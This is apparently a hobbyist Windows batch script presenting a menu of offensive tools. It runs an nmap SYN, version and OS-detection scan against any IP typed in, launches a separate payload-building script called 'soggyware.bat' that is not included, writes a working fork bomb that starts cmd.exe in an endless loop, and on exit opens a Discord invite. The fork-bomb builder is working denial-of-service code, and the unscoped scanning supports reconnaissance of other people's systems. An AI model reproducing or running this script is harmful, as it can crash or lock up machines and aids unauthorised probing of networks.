@echo off
SETLOCAL enabledelayedexpansion
echo welcome %username%...
timeout /t 2 >nul
:menu
cls
color 0C
echo 1] NMAP
echo 2] Payload Construction
echo 3] Forkbomb Builder
echo 4] exit
set /p input=">> "
if "%input%"=="1" goto nmap
if "%input%"=="2" goto payloadcons
if "%input%"=="3" goto fork
if "%input%"=="4" goto exit
goto menu
:nmap
cls
echo enter IP...
set /p input2=">> "
nmap -sS -sV -O -T4 --top-ports 1000 %input2%
pause
echo %input2% Scanned...
cls
goto menu
:: This is only if you have my soggyware file if not then. idk
:payloadcons
cls
echo Starting seperate script...
timeout /t 2 >nul
start soggyware.bat
cls 
goto menu
:fork
cls
echo file location?
set /p fileloc=">> "
if exist %fileloc% (
    echo file location exists...
    echo skipping
    timeout /t 2 >nul
) else (
    echo Building %fileloc%...
    mkdir %fileloc%
    if errorlevel==0 (
        echo Successfully built !fileloc!...
        timeout /t 2 >nul
    ) else (
        echo Error !fileloc! failed to build...
        echo Please try again later...
        timeout /t 2 >nul
        exit /b
    )
)
echo @echo off >> %fileloc%\fork.bat
echo :loop >> %fileloc%\fork.bat
echo start cmd.exe >> %fileloc%\fork.bat
echo goto loop >> %fileloc%\fork.bat
echo script built....
timeout /t 2 >nul
cls
goto menu
cls
:exit
cls
echo goodbye... %username%
timeout /t 2 >nul
start "" https://discord.gg/29uepW58st
exit /b
